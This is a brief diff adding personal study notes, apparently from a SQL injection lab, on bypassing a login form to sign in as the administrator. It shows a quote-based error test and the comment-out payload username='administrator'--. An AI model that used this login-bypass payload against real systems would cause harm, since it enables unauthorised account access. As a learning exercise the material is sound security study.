@@ -1,0 +1,18 @@
+
+
+   2:::::::------- SQL injection login functionality...
+
+   End goal :- perform sqli attack and log in as the administrator user.
+
+   Analysis :-
+   -------
+
+   SELECT firstname FROM users where username='administrator' and password='admin';
+
+   select firstname from users whrer username=''' and password='password'; ==> resulted in internal server error -- 500
+
+   select firstname from users where username='administrator'--' and password='admin'  
+   // this worked because when the query executed it returned administrator aacount and the rest of the code is commented..
+
+   select firstname from users where username='admin'
+
